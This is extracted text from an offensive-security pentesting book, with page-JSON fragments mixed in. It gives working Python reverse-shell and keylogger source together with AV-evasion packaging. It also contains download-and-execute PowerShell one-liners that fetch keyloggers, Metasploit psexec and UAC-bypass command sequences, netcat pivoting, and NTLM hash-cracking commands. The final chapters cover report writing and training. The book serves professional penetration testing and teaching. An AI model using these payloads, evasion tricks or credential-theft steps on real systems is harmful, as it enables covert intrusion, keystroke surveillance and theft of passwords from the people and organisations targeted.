Raspberry Pi 2 ● https://www.offensive-security.com/kali-linux-vmware-arm-image-download/ Or create your own image: ● https://itfellover.com/1-kali-from-git-clone-and-booting-in-19-steps/ Setting up your new drop box with Kali is pretty easy.

This is how we can get around issues like autorun and quickly use keystrokes to compromise a machine. So if we had physical access to a computer and wanted to compromise the system, what would we do?

The element of surprise could play a huge factor in how successfully you move laterally throughout the environment. This chapter will go into how to make sure you stay ahead of the curve and not alert AV scanners. Evading AV I regularly run into AV programs that alert or block the standard Meterpreter payload, Windows Credential Editor (WCE), or other common penetration testing tools.

SMBExec ( https://github.com/pentestgeek/smbexec )(Kali Linux) SMBExec is a tool developed by brav0hax (https://github.com/brav0hax/smbexec), which contains a lot of different functionalities. In this book, we have used the tool to pull hashes from a domain controller, but it can also be used to enumerate shares, validate logins, disable UAC, and create an obfuscated Meterpreter executable. Brav0hax utilizes a number of different obfuscation techniques, including randomization and compiling it in native C to bypass AV (read the source code of smbexec.sh). This is what we are going to use to create our reverse shell. To create an obfuscated reverse Meterpreter executable: ● cd /opt/smbexec ● ./smbexec.sh ● Select System Access with the following command: ○ 2 ● Select Create an executable and rc script ○ 2 ● Select windows/meterpreter/reverse_https ○ 2 ● Enter your local host and port ○ 172.16.139.209 ○ 443 "},{"pageNumber":295,"pageContent":"Once SMBExec finishes and you exit out of the application, a new folder is created in that same directory.

Although this is experimental code, I really like what Mike Czumak did. He took many of the common evasion tricks and wrote something to automate them. He built a simple encoder/decoder, added a number of instructions that waste cycles in an effort to trick the AV scanner, and utilized code caves (like we discussed with The BackDoor Factory).

I use Python to create most of my exploits and tools. There are several reasons why Python works so well. First, it is common to see systems which white-list applications that allow python files. Second, you can very easily add randomness to get around any signature. And third, using something like py2exe you can turn the file into a self-running executable. Python Shell Watching Dave Kennedy's talk at BSides in 2012{45}, took me down the track of using Python to create malicious payloads. The simplest example of this was creating a python shell and wrapping it up with py2exe. ● #!/usr/bin/python import socket, subprocess HOST = '192.168.10.100' PORT = 5151 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.send('[*] Connection Established!') while 1:"},{"pageNumber":299,"pageContent":"data = s.recv(1024) if data == 'quit': break proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) stdout_value = proc.stdout.read() + proc.stderr.read() s.send(stdout_value) s.close() When this code executes, it will create a shell connection back to 192.168.10.100, where I will have netcat listening on port 5151. This reverse shell will give me command line access into the host. Using pyinstaller, we can convert the python file into an executable: ● C:\\python27\\python.exe C:\\utils\\pyinstaller-2.0\\pyinstaller.py --out=C:\\shell\\ -- noconsole --onefile C:\\shell\\shell.py Again, if you try to scan this file with AV, it won't be picked up. Python Keylogger Everyone uses different types of keyloggers and this is no different. My goal was to develop something that would most likely be accepted on white-listed application lists and be able to run undetected by AV. Included below is simple code to have python start recording all keyboard presses:{46} ● import pyHook, pythoncom, sys, logging file_log = 'C:\\\\systemlog.txt' def OnKeyboardEvent(event): logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s') chr(event.Ascii) logging.log(10, chr(event.Ascii)) return True hooks_manager = pyHook.HookManager() hooks_manager.KeyDown = OnKeyboardEvent hooks_manager.HookKeyboard() pythoncom.PumpMessages() Here is my setup.py file: ● from distutils.core import setup import py2exe setup(options = {'py2exe': {'bundle_files': 1, 'compressed': True}}, windows = [{'script': \"logger.py\"}], zipfile = None, ) And using py2exe, I will convert the python script to an executable with the following commands: ● python.exe setup.py install"},{"pageNumber":300,"pageContent":"● python.exe setup.py py2exe Now I will have an executable binary of the keylogger that records all keystrokes and stores all of the key strokes to C:\\systemlog.txt. Pretty simple and easy and AV never detected it. If you need to, you may add some randomness in there to make sure that it isn't picked up by signatures or hash matching. Other Keyloggers Being able to drop an undetectable keylogger can make a huge difference in situations where you can’t pull passwords from memory or look for web-based passwords. I will show you two different examples that can be executed from a command line. Keylogger Using Nishang ( https://github.com/samratashok/nishang ): Nishang is a collection of PowerShell scripts used for pre/post exploitation. One of the scripts is called keylogger.ps1. As I keep reiterating throughout the book, and as you will notice in different penetration tests, nothing ever works perfectly. You will need to know different ways to execute commands and understand that different environments may or may not allow you to do certain things. In this case, we assume that we have a shell on the system. We are going to use bitsadmin, which is used by Microsoft Windows to download updates, to download our keylogger and put it in the public folder. We will then go to the public folder and execute the keylogger. The keylogger has many other functions, such as pushing the logs to Twitter, so I recommend you read through it before executing anything. ● cmd.exe /c \"bitsadmin /transfer myjob /download /priority high https://raw.githubusercontent.com/cheetz/nishang/master/Gather/Keylogger.ps1 c:\\Users\\Public\\Keylogger.ps1\" ● cd \\users\\public\\ ● powershell.exe -NoP -W Hidden -exec bypass -noexit -Command \".\\Keylogger.ps1 http://127.0.0.1 stopthis\" The output will be located at: ● C:\\Users\\[Account]\\AppData\\Local\\Temp\\key.log Note that when looking at the file, it is obfuscated and needs to be converted. Once you move this file onto your box, convert the logs using the P owerShell script located here: https://raw.githubusercontent.com/cheetz/nishang/master/Utility/Parse_Keys.ps1 . Here is the command to convert the logs: ● powershell.exe -exec bypass -Command \"& {Import-Module .\\Parse_Keys.ps1; Parse_Keys key.log output.log}\""},{"pageNumber":301,"pageContent":" And your decoded keylog output file is written to output.log. Keylogger Using Powersploit ( https://github.com/mattifestation/PowerSploit ): The other keylogger with which I have had some success is the Get-Keystrokes PowerShell script. Similar to running the Nishang script, this can be executed by the following command: ● powershell.exe -exec bypass IEX \"(New-Object Net.WebClient).DownloadString('https://raw.github.com/cheetz/PowerSploit/master/Exfiltration/Get- Keystrokes.ps1');Get-Keystrokes -LogPath C:\\Users\\Public\\key.log\" ● Conclusion There are many different techniques to evade AV. Although this is not a complete list, this should give you a good overview on where to start if you are battling anti-virus. The last thing you want is for AV to stop you from popping a box that you can potentially exploit. Penetration testing is all about trying out different tools, techniques, and tactics to find what works in that particular environment. Remember not to submit your executable to a repository like Virus Total, as the lifespan of your executable might shrink dramatically."},{"pageNumber":302,"pageContent":"Special Teams - Cracking, Exploits, And Tricks This section focuses on all other methods that can assist in penetration testing, but do not fit in the other sections. I will discuss some of the tips and tricks I have for cracking password hashes, searching for vulnerabilities, and some short cuts. Password Cracking There are many different tools to use with password cracking, however, I am going to focus mainly on two tools that I use. These two tools are John the Ripper (JtR) and oclHashcat. These are both excellent tools for cracking passwords. Before I can start talking about different password crackers, it is important to make sure you understand the basic definitions. The three configurations you should generally make for an efficient password cracking process are to define wordlists, rules, and hashing algorithms. Wordlists: This is exactly what it sounds like–they are files that contain password lists in cleartext. The password cracker software will try to hash each one of these passwords and see if they match the hash that you are trying to crack. I generally like to take wordlists from prior password compromises and incorporate them with the type of organization you are dealing with. For example, if you are cracking NTLM hashes from a domain controller, make sure you understand what their password policy is. There is no point trying four or five-letter passwords if they require a minimum of eight characters. Here are some of my favorite wordlists: List Name: RockYou Details: Compromised in 2009 from a social game and advertising website. This is a great list to start with as it isn't too large and contains a lot of the common passwords with a decent success rate.

The best way to describe rules is by an easy-to-follow example. We can take and use the KoreLogicRulesAppendYears ( http://contest-2010.korelogic.com/rules.html ) set of rules, which look like the following: ● cAz\"19[0-9][0-9]\" ● Az\"19[0-9][0-9]\" ● cAz\"20[01][0-9]\" ● Az\"20[01][0-9]\" It will append the years from 1949 to 2019 in each and every password. If the password list contained the word \"hacker\", it would try to crack the hash for the string hacker1949 all the way to hacker2019. Remember, the more complex rules you have, the more time it will take to finish going through all the different words in the word list. Hash Algorithms: A hashing algorithm is used to generate the password hash. These are very important because if you select the wrong algorithm, it will either fail to run or fail to crack. For example, if we select the MD5 algorithm for SHA1 hashes, the cracking tools will not find any hashes to crack and will exit immediately. Now that we have basic understanding of different cracking configurations, let's compare John the Ripper versus oclHashcat. John The Ripper ( http://www.openwall.com/john/ ) (Windows/Kali Linux/OS X): I used to regularly use John the Ripper (JtR) but moved away from it a while ago due to the GPU support from oclHashcat. However, JtR Jumbo does have CUDA and OpenCL support now. Here is a list of JtR hash formats to help you identify which type of password you are cracking: http://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats. Cracking MD5 Hashes Let's say you are able to compromise a *nix system or maybe a database full of password hashes. You will most likely run into MD5 or SHA hashes, but for the following example, we will assume that they are non-salted MD5 hashes. If you are looking to crack standard MD5 hashes, the basic command is: ● john -format=raw-md5 -pot=./list.pot md5list.txt "},{"pageNumber":305,"pageContent":"This will tell john the ripper to look in the md5list.txt file for MD5 hashes and write any cracked passwords into the file list.pot. root@kali:~# john --format=raw-md5 --pot=./list.pot md5list.txt Loaded 3 password hashes with no different salts (Raw MD5 [128/128 SSE2]) test (test) password (user) woot (hacker) guesses: 3 time: 0:00:00:01 DONE (Sun Dec 29 18:32:12 2013) If you are using the JtR Jumbo pack and want to take advantage of GPU processing: ● john --format=raw-md5-opencl --wordlist=./Wordlists/all.lst --rules: Single md5list.txt Here are additional sources on using JtR: http://blog.thireus.com/cracking-story-how-i-cracked-over- 122-million-sha1-and-md5-hashed-passwords. OclHashcat ( http://hashcat.net/oclhashcat/ )(Windows/Kali Linux): Honestly, this is the tool I use most when password cracking. As we all know, graphic processing units (GPUs) are great for cracking passwords as they utilize many different cores in parallel. The advantages of using GPUs vs. CPUs are very significant and this can be demonstrated with the use of oclHashcat. In the following examples, I am going to go over cracking WPAv2 and NTLMv2. These are the most common hash types I run into and they are typically the groundwork for any other types of hashes. If you want to see all the different hash types that oclHashcat will support, visit their website at http://hashcat.net/oclhashcat/ . Cracking WPAv2 In the beginning of the book, I discussed how to capture the WPAv2 handshake, which is required for password cracking. The output from the capture was a .hccap file. This is the file format that oclHashcat supports for brute forcing WPA-hashed passwords. In the following examples, I am going to utilize oclHashcat on my Windows host using a GeForce GTX 680. Generally, I prefer using the ATI Radeon cards, but for this example, it won't make much of a difference. To kick off the password cracking, I will use the command: ● cudaHashcat-plus64.exe -m 2500 out.hccap list\\rockyou.txt "},{"pageNumber":306,"pageContent":"oclHashcat Example This is a very straightforward example, which says to crack WPAv2 hashes against the out.hccap file and use the password list from rockyou.txt. Cracking NTLMv2 If you have compromised a Windows Host or maybe a Domain Controller, you will have to crack NTLM hashes. You can always try to crack the LM hashes, but they are becoming more and more difficult to find, so we will stick with the NTLM hashes. In the following example, we are taking a list of NTLM hashes and using the rockyou password list. "},{"pageNumber":307,"pageContent":"oclHashcat NTLM From the example above, there were three unique passwords, but oclHashcat was only able to crack two of the three passwords. To increase our chances, I am going to add the passwordspro rule set to assist with the rockyou password list.

"},{"pageNumber":308,"pageContent":"oclHashcat with Rules Using the rules didn't actually find the password for the third hash. In larger password hash lists, this would have definitely found more passwords, but was only able to find two out of the three passwords in this scenario. To increase our chances even more, I will try a much larger password list. This, of course, increases the amount of time needed to run this job. However, if it resolves a password, it will be worth it. The command to use is: ● cudaHashcat-plus64.exe -m 1000 NTLM.txt list\\realhuman.txt -r rules\\passwordspro.rule "},{"pageNumber":309,"pageContent":"oclHashcat with Different Password List As you can see from the results, the new password list and rule set recovered the third password. Just by playing around with different password lists and rule sets, you can quickly find out what works and what just takes too long to run. This is all based on what types of GPUs you have, how long the password lists are, and the complexity of your rule set. Whether you want to crack MD5 hashes, MSSQL hashes, SHA1 hashes, or others, this same query can be run by changing the \"-m\" parameter. For a full listing of hashes that oclHashcat accepts and cracks, go to: https://hashcat.net/wiki/doku.php?id=example_hashes . Cracking in Real Life You were able to successfully dump the Domain Controller. The next step is to see what you are able to recover. Historically there were Rainbow tables, but with minimum length restrictions, size and time became a huge issue. Trying to create Rainbow tables for 10+ characters becomes so expensive that it isn’t really usable on a penetration test (unless you find LM hashes)."},{"pageNumber":310,"pageContent":" oclHashcat is the fastest password recovery tool that I have ever dealt with. I have used John the Ripper and other tools, but due to the use of GPUs, rules, pre-processing, and password lists, I generally turn to oclHashcat as my go-to password-cracking tool. This chapter will talk about how to effectively use oclHashcat in a pentest and will mostly focus on cracking NTLM hashes; however, you can use these examples with any hashes. My password cracking rig was presented in the Pre-Game phase and with a little bit of money, you can be running your own password cracking monster. So, you were able to extract the SUCK Domain Controller hashes. The next step is to be able to see what you can recover from those hashes. In our example, we are using a password dump similar to what I have seen in the field. Our compromised DC has a list of over 21,000 hashes. We could first start by straight brute forcing through all the characters, but is this really feasible? Let’s see by running the command: ● oclHashcat64.exe -m 1000 hashes\\hashes.lst -a 3 ?a?a?a?a?a?a?a?a --force Command Breakdown: ● oclHashcat Executable: oclHashcat64.exe ● -m 1000: The hashes we are supplying are in the format of NTLM ● hashes\\hashes.list: Stored location of the Domain Controller Hashes ● -a 3: using brute-force Attack mode (using a mask below) ● ?a?a?a?a?a?a?a?a: 8 combination of letters, numbers and special (upper/lower case) characters This definitely isn’t the most efficient way to crack hashes, but it can really cover those odd passwords like Jdkl!3vG that might not be in a password list. Masks will be very important to learn, so if you haven’t dealt with them before, make sure to check out oclHashcat’s site: https://hashcat.net/wiki/doku.php?id=mask_attack . Remember that we are going for speed and efficiency on a test, so let’s see what results the brute- force attack will provide: "},{"pageNumber":311,"pageContent":"oclHashcat Brute-Force We can already see that this is going to take four days to go through all eight characters. We could use smarter masks based on human tendencies. We know that if there are password requirements, such as upper/lower/special character, most people put the capital letter in the front, the special character at the end. We could create these custom masks to better improve efficiency, but this will still take a fair amount of time. For efficiency sake, the next best step is to start testing large password hashes. We are going to focus on using two different password lists: Crackstation and m3g9tr0n_Passwords. It is important for you to find out which password lists work well in various industries. Let’s start with the Crackstation list, which contains roughly 64 million passwords: ● oclHashcat64.exe -m 1000 hashes\\hashes.lst lists\\crackstation_realhuman_phill.txt - -force The results below on the left show that in six seconds, we were able to test all the hashes against the password list. Using the Radeon R9 295x2, we are able to get some great speed against these lists. Unfortunately, the results from these hashes are pretty low with 780 or about 3.66% passwords recovered. The next step is to run the hashes against rules. Luckily, oclHashcat has provided a list of great rules to run. They are located inside the oclHashcat directory, in the rules folder. I recommend going"},{"pageNumber":312,"pageContent":"through each of them and understanding what the differences are between the rules.

Prince: Prince is a password guess generator and can be thought of as an advanced Combinator attack. Rather than taking input from two different dictionaries and outputting all the possible two-word combinations, Prince only has one input dictionary and builds \"chains\" of combined words ( http://reusablesec.blogspot.com/2014/12/tool-deep-dive-prince.html ). Prince was introduced in late 2014 to advance the attacks on password guessing. As more and more people started using complex passwords, following the example set by this xkcd comic strip, http://xkcd.com/936/ , it became harder to password guess. What Prince does is take a password list and generates all the different combinations it can. If you have a list with: ● a ● cat ● house It will build a list of passwords: ● acat ● ahouse ● acathouse ● ahousecat ● cata ● cathouse ● catahouse ● cathousea ● ... and so on. Using this technique, we can take some of our favorite password lists and generate great password combination lists. We will start with a small list of passwords, add our custom words and start building from there. In this case, I used the following password list, which had a good number of basic passwords: ● https://raw.githubusercontent.com/discourse/discourse/master/lib/common_passwords/10k- common-passwords.txt Next, I added the words scraped from the Bloodhound and Webscraper examples. In total, I have about 15,000 words to create these different password lists.

RC Scripts Within Metasploit Since I try to encourage efficiency, some scripts that you should look into are Metasploit's resource (RC) scripts. These scripts can be created to help speed up common tasks you might perform. For this example, I am creating a script to use the PSExec module, use smart_migrate to migrate the Meterpreter process into another PID, and set all the fill-in other information required for the attack. We will save the following code to demo.rc: ● use exploit/windows/smb/psexec ● set rhost 192.168.10.10 ● set smbuser Administrator ● set smbpass ________________hash_____________ or password ● set smbdomain ____domain_____ ● set payload windows/meterpreter/reverse_tcp ● set AutoRunScript post/windows/manage/smart_migrate ● setg lport 443 ● setg lhost 192.168.10.3 To run the script, from a shell prompt enter: ● msfconsole -r /root/demo.rc "},{"pageNumber":329,"pageContent":"RC Scripts All you have to do after it loads is type: exploit.

This is a much faster way to prepare your scripts, exploits, and especially handlers. I like to add features like auto-migrate or add custom payloads to exploits. Windows Sniffer There might be times where you might need to start a sniffer on the host system. This can be done on any Win7 or higher OS with Administrative Privileges, without any additional software.{47}{48} ● netsh trace start capture=yes overwrite=no tracefile=C:\\Users\\Public\\sniff.etl ● netsh trace stop To convert the etl file to something we can view in Wireshark (.cap file), we have to do the following: ● On Win 8, first install Message Analyzer: ○ http://www.microsoft.com/en-us/download/details.aspx?id=44226 ● Run the command: ○ powershell -exec bypass command \"import-module PEF; $s = New- PefTraceSession -Path 'C:\\Users\\Public\\OutFile.Cap' -SaveOnStop; $s"},{"pageNumber":330,"pageContent":"| Add-PefMessageProvider -Provider 'C:\\Users\\Public\\sniff.etl' ; $s | Start-PefTraceSession\" The output will be located in C:\\Users\\Public\\OutFile.Cap, where you can just open this file in WireShark. Remember that by default, it only captures 250MB, so if you need more space, specify the MaxSize=<Size> switch. So, what do you do after you capture a lot of different network traffic? You need to parse through it. We are going to use a tool called net-creds developed by Dan McInerney. Net-creds is a tool that sniffs passwords and hashes from a pcap file. It will include URLs, username/passwords in cleartext, SNMP, SMTP, NTLM, and Kerberos. Since this tool only takes in pcap files, it is important to first convert your cap file to a pcap file. I usually do this by loading the cap file into Wireshark and saving it back as a pcap. Once we have a pcap file, we can run the following commands: ● cd /opt/net-creds ● python net-creds.py -p [pcap file] root@kali:/opt/net-creds# python net-creds.py -p OutFile.pcap [192.168.1.85] GET next-services.apps.microsoft.com/ [192.168.1.85:49764 > 192.168.210.76:21] FTP User: hacker [192.168.1.85:49764 > 192.168.210.76:21] FTP Pass: password [192.168.210.76:21 > 192.168.1.85:49764] Authentication: authentication successful [192.168.1.85:51234 > 192.168.210.76:445] NETNTLMv2: lab::hacker.testlab:11223344... Bypass UAC There are times when you might have an administrative account and a Meterpreter session, but you can't become system by using the \"getsystem\" command. This is most likely because User Account Control (UAC) protection is blocking you from running the getsystem command. In the past and in the previous book, we used either a custom upload of bypassUAC from David Kennedy or used the metasploit module bypassuac. The issue was that it had to drop an executable, which would generally spawn a second file as well. I have often seen instances where AV would pick up either one of the two files. To get around this, I migrated from using bypassuac to using bypassusac_injection. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of the three separate binaries in the standard technique. The reason I switched is because I have had better luck evading AV using DLL versus executables. If you need to use a custom DLL, you can always set EXE::Custom to your DLL. Let’s walk through an example where you need to get to system quick. You might see something like this:"},{"pageNumber":331,"pageContent":"● msf exploit(bypassuac_injection) > sessions -i 1 ● [*] Starting interaction with 1... ● meterpreter > getsystem ● [-] priv_elevate_getsystem: Operation failed: The environment is incorrect. If you do have an administrative account, most likely UAC is blocking execution, which is enabled by default. To get around this, you will need to background the current Meterpreter process, use the bypassuac_injection module, set your options, and run it: ● meterpreter > background ● [*] Backgrounding session 1... ● msf exploit(bypassuac_injection) > use exploit/windows/local/bypassuac_injection ● msf exploit(bypassuac_injection) > set target 1 ● target => 1 ● msf exploit(bypassuac_injection) > set PAYLOAD windows/x64/meterpreter/reverse_https ● PAYLOAD => windows/x64/meterpreter/reverse_https ● msf exploit(bypassuac_injection) > exploit Note that if you are targeting a x64 host, you need to make sure to set the PAYLOAD to a 64bit payload and set the target to “1” which is a Windows 64bit OS.

Instead, you might be able to plug your NetHunter device into a USB port and hit execute. You wait as it calls a PowerShell Meterpreter script and creates a reverse shell. Another use for something like the HID Keyboard Attack is with kiosks. I have seen plenty of kiosks that either have a limited physical/virtual keyboard, or no keyboard at all, but have USB ports. This is a great attack for just that. Building A Custom Reverse Shell I did a presentation at one of the LETHAL meetings about problems we sometimes encounter on engagements. As we run into more and more complex firewalls, we need to look at things differently. One thing I started seeing is application-based firewalls. The idea behind this is that the firewall looks at the packets to see if they are communicating the proper protocols on the proper ports. So, you can’t run SSH on web ports (80/443) and the company does full “man in the middle” SSL proxying. Therefore, not only do we need to look like the protocols that are specific on ports, but we also need to evade any sort of IDS. When I teach, I love to give the doomsday scenario. Let’s say Metasploit no longer works, you have full SSL interception, and IDS work great. What can you do? I started building a framework exactly for this. What were my requirements? ● Bypass application-based firewalls ● Make everything seem normal to an analyst ● Be able to have full control of the host ● Be able to upload/download files ● Make penetration testing faster ● Generate client executables and evade AV I built and implemented the communication protocol first. From there, I can build all the modules.

Whether you are sending your victim’s files or commands, they will all follow the same structure. Think about this for a second: If you are monitoring the network or configuring an IDS, how do you detect this type of traffic? Unless you are reading line by line, the traffic looks just like normal web traffic. There are no patterns or special characters, and the sentences actually look like sentences (but don’t make sense of course). You could be on this host all day long and never be detected.

A big change that occurred in the last year is that Microsoft patched the ability to connect to remote systems using accounts that are members of the localgroup “Administrators”. This used to be the easiest method to move laterally when you grabbed Local Admin passwords from Group Policy Preferences and used PSExec. There is one exception to this–the patch did not affect local default admin accounts with RID 500. Even if you changed the username for the RID 500 account, it can still be used to move laterally.(54) (55) Once you obtain hashes for the RID 500 account or you get onto a network without patched client systems, you can use the hashes, instead of passwords, to gain Meterpreter shells.

In these cases, you will have to proxy off a user with the proper IPs or access. Windows: One of the cheap and easy ways to proxy between hosts in segmented networks is to utilize a default Windows function. Netsh is a command line tool to modify network configurations. The following command will put the host in listening mode on port 8080 and redirect all requests to 192.168.5.33 over port 3389. This will be an easy way to proxy RDP traffic into other hosts. Remember you will need elevated privileges to run these commands.

You can now take one of the compromised hosts and proxy your RDP requests to that segmented network.(57) Linux: The old but always faithful proxying through Linux uses Netcat and backpipes. On the victim host through which you want to proxy, run the following commands below.(58) ● mknod backpipe p ● nc -l -p 8080 0<backpipe | nc 10.0.18.134 3389 | tee backpipe In the example above, we proxy through the compromised host by connecting to port 8080.

Now, I want to also mention their commercial counterparts. This is solely to build awareness of what is available out there as a resource. I am frequently asked if it is better to go totally open source or commercial products. There is no right or wrong answer. What is important is that you do not limit yourself to one side or the other, but instead, find the processes, tools, and techniques that are right for that particular job. Cobalt Strike: Cobalt Strike is one of my favorite tools for a multitude of reasons. Cobalt sits on top of the Metasploit Framework and can attack, pivot, evade AV, establish persistence and, most importantly, provide custom payloads (such as Beacon). More on Beacon here: http://www.advancedpentest.com/help-beacon . The main reason I recommend that all pentesters look into Cobalt Strike is due to the way their C2s communicate over DNS. Networks are starting to thoroughly regulate what traffic can go out of the network with tools such as Next-Generation Firewalls. Tools like Cobalt Strike use DNS as a way to use the current network infrastructure in order to bypass a lot of the network security detection tools. New Cobalt Strike licenses cost $3,500 per user for a one-year license. License renewals cost $2,500 per user, per year. You can get a 21-day trial license by going to: http://www.advancedpentest.com/ A lot of the attacks discussed in this book–such as keyloggers, pivoting, AV evasion–are incorporated into Cobalt Strike in an easy-to-use fashion. The best part is that you are able to see your attacks visually, while having full command line, as you would with msfconsole. It is really the best of both worlds.

It heavily utilizes the Metasploit Framework, but extends it significantly. The penetration game is changing and what used to be smash-and-grab penetration testing is now about low and slow. Immunity Canvas ( http://www.immunityinc.com/products/canvas/ ) (Kali Linux/OS X/Windows) Immunity's Canvas makes available hundreds of exploits, an automated exploitation system, and a comprehensive, reliable exploit development framework to penetration testers and security professionals worldwide.(59) Similar to Metasploit’s framework, Canvas is built to be very flexible and is easy to build upon. Instead of being built on Ruby, as with the Metasploit Framework, Canvas is built on Python. The GUI is built on top of pyGTK. Canvas’ bread and butter is the fact that it uses MOSDEF. MOSDEF is a custom C compiler for payload construction. This allows attackers the ability to write additional code in the memory of the exploited host without having to touch the disk.

For more information, go to: http://www.immunityinc.com/products/canvas/canvas-exploit-packs-overview.html Conclusion: Canvas is a great toolkit to have in your bag. The fact that it uses Python as its core makes it easy for many penetration testers to build their own modules and exploits. If you are looking for someone else to do a lot of the 0-day research on third party software, I highly recommend investing in Canvas. Core Impact ( http://www.coresecurity.com/core-impact-pro ) The last commercial tool I want to discuss is Core Impact. Core is probably one of the most expensive tools you can have in your offensive testing bag, but it is worth the price. Core Impact allows for easy automation of exploitation and is said to have 25% more unique Common Vulnerability Exploits (CVE) versus its competitors. For those who are really looking for a more automated visual approach, Core Impact is for you. It is an all-in-one tool to attack web, network, mobile, client and even wireless.

Their exploits are well-tested, actively work on IDS/AV evasion, and perform most of the local information gathering that you might do on a penetration test. It takes most of the manual work out of the test. The example below shows that I have compromised a host and kicked off the Local Information Gathering module.

You have finally fully compromised Secure Universal Cyber Kittens, pivoted to sensitive networks, stolen credentials and documents, and managed to keep backdoors on their servers. Now, it is time to wrap up the test and write the final report. The final delivered report is really the only thing that will matter to the client. The report is how you, the penetration tester, will get paid and be asked to come back. Therefore, this is by far the most important aspect of your test. You need to be able to explain the findings, rate the vulnerabilities, and explain how the results will affect the customer in the real world. Regardless of how many hosts you compromise or how quickly you move laterally through the network, if the client can’t understand the end report, reproduce exploitation, and effectively implement remediation, it is not worth its value. Anyone can run a vulnerability scanner and change the organization name, but not everyone can understand what the vulnerabilities actually mean. If you have ever had multiple penetration testers assess your network, you will find that the reports will vary based on who is performing the test. Some pentesting companies will just re-template a vulnerability scanner report, while quality pentesting companies will provide a well-detailed report and include repeatable steps. There is little value in a report that merely states that the client has 100 critical Apache/PHP findings. Real value comes from the fact that the report can confirm whether or not the findings are valid based on the vulnerability, not just based on the banner version. Your final report should be influenced by your own presentation style and findings. However, I will give you some hints and best practices when creating your report. Some things to think about when writing a report: ● I say this every time: DON’T SUBMIT A RE-TITLED Nexpose or Nessus report. I have seen this happen more than once or twice in my lifetime, where we received a re-titled report from a consulting company. ● Rate your vulnerabilities ○ You should figure out a way to consistently rate your vulnerabilities. I have built my own matrix that includes references from NIST, DISA, CVSS, and personal experience to assign ratings to vulnerabilities. ○ The matrix includes increasing or decreasing severity based on internal/external findings, possible availability of exploit code, how widespread their systems are, what the exploits can lead to, and how it affects the CIA security triangle. ○ Vulnerabilities that go through my matrix will always have the same criticality level. If a client asks how I scored a rating for a vulnerability, I can reference my matrix. ○ You might have a vulnerability that might be a “medium” in severity to the scanner, but what if it is systemic? If it is found not on one host"},{"pageNumber":380,"pageContent":"but on every host, does the overall severity of the issue turn to “high”? ● Theoretical vs. Real Findings ○ I generally do not like to mark findings as critical if they are only theoretical and have no actual known exploit available. These should still be considered findings, but I will generally lower the rating if I can't find any avenue to exploit the host. ○ This gives the client help in properly identifying which findings need immediate attention versus those that can be applied during a regular change control window. ● Solutions are just as important as the findings ○ If you use a tool to compromise a network, you have to have a solution to stop it. ○ If you don't have a solution, help the client develop a mitigation strategy. ● Don’t mis-rate vulnerabilities ○ HTTP Flags: As I have said in the prior book, I still see HTTP flags all the time. A scanner will come back with flags not being enabled, such as secure flag or missing httpOnly. What if the site doesn’t even support any type of client authentication or even provide a user with any input variables? It is definitely a finding, but it could be significantly lower than the scanner outputs. ○ Cross site scripting can be very dangerous, but having a “high” finding within a forum versus a site that has no users or data to be inputted to a backend database, should have very different ratings. ○ Apache Findings: This is a great example of what I feel distinguishes good reports from bad reports. Apache findings come up all the time because they are solely based on banner results. You might see a PHP- CGI finding that comes up as critical and report it, but when the client investigates it, he/she finds that CGI wasn’t even enabled on the server. ● Make sure vulnerabilities are actual vulnerabilities ○ I don't know how many times I have received penetration testing results telling me my systems had PHP exploits on them. This is because the scanner, based on version, alerted them of these critical findings. Some of the findings state that they are PHP CGI issues or Apache mod security issues. The problem is my servers don't run the CGI scripts, but the scanner identified the issue just solely based on versioning. Please make sure that you validate that findings are actual findings. ● Standardize all your reports by using LaTex templates or something similar. Again, all these findings should be reported, but having the right severity rating is what is important. It is critical when writing a penetration test to identify what is realistic versus what is theoretical. I generally have two parts to a report–the first is what can actually be done with known exploits, and the second is everything else that the scanner picked up."},{"pageNumber":381,"pageContent":" What you shouldn’t you do: http://it.toolbox.com/blogs/securitymonkey/the-worlds-worst-penetration-test-report-by- scumbagpentester-58747 What you should have in your report: ● Introduction/Overview ○ High-level description of the project, dates, and company/infrastructure being tested. ● Scope and Objectives ○ This section should outline the IP ranges, URLs, and applications that are to be tested. It should also explain the purpose of the test. ● Deviations from the Statement of Work ○ Many tests have changes from the original requirements, such as having to stop testing on a host, to stop scanning, and/or make changes to the testing windows. ● Methodology ○ A high-level description of the testing process and standards. ● Significant Assessment Findings ○ This section should be dedicated to critical findings. ● Positive Observations ○ This part is just as important as the significant findings.

Talking about what the company did well helps lessen the blow on where fixes need to be made. ● Findings Summary ○ Overall view on the findings broken down by severity. ○ Conclusion of summary that explains if the environment was found to be vulnerable for any opportunities for exploitation. ● Detailed Findings ○ This should include severity, vulnerability definition, issue/detailed description/risks, asset, recommendation, snapshots/logs/how to exploit walkthrough ● Appendix ○ Listing of all assets and ports ○ Additional information and snapshots Some examples of reports: http://isecpartners.github.io/publications/iSEC_Cryptocat_iOS.pdf https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf http://www.pentest-standard.org/index.php/Reporting http://resources.infosecinstitute.com/writing-penetration-testing-reports/"},{"pageNumber":382,"pageContent":" There are times when I generate a second report, based on the client. The second report will be directed toward higher management and will discuss the systemic issues and patterns of gaps in security. This shouldn’t be very detailed or technical, but should mainly state facts at a high-level, based on the test. Lastly, if you want to set yourself apart from other pentesters, try to find ways to give yourself added value that others may not offer. For example, if you are doing a PT for a large company, you can provide a simple OSINT (Open Source Intelligence) report, in addition to the final report, to describe what and who can be publicly found from the Internet. There have been times when I created scripts (Python, PowerShell, Bat) that perform checks against critical findings, so that after they remediate their systems, they can just execute the script to verify. "},{"pageNumber":383,"pageContent":"Continuing Education So, you have just finished this book and may have a thirst for more. One of the most important factors in succeeding in this field is that it takes experience–not just learning from books and videos. Start learning from labs and vulnerable VMs. If you do not currently work for a penetration testing company, start working on bug bounties. Bug bounties are legal ways to find security bugs on production sites. Remember to read ALL the fine print before doing any testing. Bug Bounties: ● https://bugcrowd.com/list-of-bug-bounty-programs ● http://www.bugsheet.com/bug-bounties Secondly, if you aren’t involved in the security community, you’re doing it wrong! It is easy to get involved. There are a ton of local security groups in every city: B-sides: http://www.securitybsides.com/w/page/12194156/FrontPage OWASP: https://www.owasp.org/index.php/OWASP_Chapter Hacker Spaces: http://hackerspaces.org/wiki/List_of_hackerspaces Major Security Conferences: If you are looking for the bleeding-edge research, security conferences are the place to go. It is a great place to meet like-minded 